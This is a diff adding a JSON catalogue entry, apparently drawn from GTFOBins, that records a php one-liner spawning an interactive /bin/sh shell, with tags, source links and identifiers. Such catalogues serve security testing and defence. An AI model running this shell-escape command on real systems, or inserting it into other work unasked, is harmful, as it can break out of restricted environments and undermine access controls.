@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-php-shell-2",
+  "name": "GTFOBins · php (shell) #2",
+  "command": "php -r 'passthru(\"/bin/sh -i\");'",
+  "description": "Use php to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "php",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/php/#shell",
+  "upstream_id": "php/shell/1",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/php/"
+    }
+  ]
+}
